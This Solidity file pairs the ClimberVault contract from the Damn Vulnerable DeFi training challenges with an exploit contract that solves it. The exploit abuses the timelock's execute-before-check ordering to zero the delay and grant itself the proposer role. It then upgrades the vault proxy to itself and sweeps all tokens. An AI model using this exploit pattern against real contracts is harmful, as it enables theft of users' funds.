// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

import "hardhat/console.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(
        address token,
        address recipient,
        uint256 amount
    ) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(
            token,
            _sweeper,
            IERC20(token).balanceOf(address(this))
        );
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}

contract ClimberVaultExploit is UUPSUpgradeable {
    ClimberTimelock private immutable timelock;
    address private immutable proxy;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private immutable salt = 0;

    constructor(address payable _timelock, address _proxy) {
        timelock = ClimberTimelock(_timelock);
        proxy = _proxy;

        targets = [
            address(timelock),
            address(timelock),
            address(proxy),
            address(this)
        ];
        values = [uint256(0), uint256(0), uint256(0), uint256(0)];
        dataElements = [
            abi.encodeWithSignature("updateDelay(uint64)", uint256(0)),
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                bytes32(keccak256("PROPOSER_ROLE")),
                address(this)
            ),
            abi.encodeWithSignature("upgradeTo(address)", address(this)),
            abi.encodeWithSignature("schedule()")
        ];
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }

    function exploit() public {
        /*  operations:
        - updateDelay to 0
        - grantRole proposer to this
        - upgrade climber to exploit
        - schedule this operation
        */
       timelock.execute(targets, values, dataElements, salt);
    }

    function sweep() public {

        IERC20 DVT = IERC20(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);

        uint256 balance = DVT.balanceOf(address(this));
        console.log("balance: %s", balance);
        DVT.transfer(tx.origin, balance);
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal virtual override {}
}
